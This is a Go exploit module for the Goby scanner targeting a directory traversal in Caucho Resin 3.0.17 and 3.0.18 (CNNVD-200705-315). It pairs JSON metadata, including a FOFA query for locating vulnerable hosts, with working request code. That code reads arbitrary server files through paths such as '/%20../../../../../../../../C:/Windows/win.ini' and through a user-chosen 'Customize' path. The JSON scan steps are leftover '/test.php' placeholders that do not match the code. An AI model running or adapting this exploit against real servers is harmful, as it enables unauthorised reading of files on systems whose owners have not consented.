package exploits

import (
	"strings"
  "errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Caucho Resin / Directory Traversal Vulnerability(CNNVD-200705-315)",
    "Description": "<p>Resin is a web server developed by Caucho Technology for use under Microsoft Windows operating system. </p><p>In versions 3.0.18 and 3.0.17, there is a vulnerability in the processing of user requests, which can be exploited by a remote attacker to traverse the server's directory.</p>",
    "Product": "Resin",
    "Homepage": "https://www.caucho.com/",
    "DisclosureDate": "2021-07-15",
    "PostTime": "2024-09-18",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "server=\"Resin\"&&(server==\"Resin/3.0.17\" || server==\"Resin/3.0.18\")",
    "GobyQuery": "server=\"Resin\"&&(server==\"Resin/3.0.17\" || server==\"Resin/3.0.18\")",
    "Level": "1",
    "Impact": "<p>In versions 3.0.18 and 3.0.17, there is a vulnerability in the processing of user requests, which can be exploited by a remote attacker to traverse the server's directory.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/ping-0day/templates/blob/main/CNNVD-200705-315.yaml",
        "https://blog.csdn.net/iteye_3856/article/details/81885483"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize,findFile",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal",
        "2H1W"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        "CNNVD-200705-315"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "Caucho Resin / 目录遍历漏洞（CNNVD-200705-315）",
            "Product": "Resin",
            "Description": "<p>Resin是一款由Caucho Technology开发的WEB服务器，可使用在Microsoft Windows操作系统下。&nbsp;</p><p>Resin捆绑了自己的单机版Web服务器，默认下运行在8080端口上，在3.0.18和3.0.17两个版本中，其对用户请求的处理上存在漏洞，远程攻击者可以利用此漏洞遍历服务器的目录。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Resin捆绑了自己的单机版Web服务器，默认下运行在8080端口上，在3.0.18和3.0.17两个版本中，其对用户请求的处理上存在漏洞，远程攻击者可以利用此漏洞遍历服务器的目录。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Caucho Resin / Directory Traversal Vulnerability(CNNVD-200705-315)",
            "Product": "Resin",
            "Description": "<p>Resin is a web server developed by Caucho Technology for use under Microsoft Windows operating system.&nbsp;</p><p>In versions 3.0.18 and 3.0.17, there is a vulnerability in the processing of user requests, which can be exploited by a remote attacker to traverse the server's directory.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In versions 3.0.18 and 3.0.17, there is a vulnerability in the processing of user requests, which can be exploited by a remote attacker to traverse the server's directory.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`
	postOrGet_cayhbusduftyvbatyudfgvbytassdfbtguaasfahbbfgjahf := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
    requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/%20../web-inf/"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/%20../web-inf/": "Directory of / ../web-inf/",
			}
			// 函数继承
			uploadFileFunc := postOrGet_cayhbusduftyvbatyudfgvbytassdfbtguaasfahbbfgjahf

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"/%20../../../../../../../../C:/Windows/win.ini", "; for 16-bit app support"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_cayhbusduftyvbatyudfgvbytassdfbtguaasfahbbfgjahf

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl ="/%20../../../../../../../../" +goutils.B2S(ss.Params["Customize"])
			} else if mode == "findFile" {
        expResult.Success = true
        expResult.Output = "Please visit the following URL to discover more files:\n" + expResult.HostInfo.FixedHostInfo + "/%20../web-inf/"
        return expResult
      }else{
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
      expResult.Output = resp
			return expResult
		},
	))
}
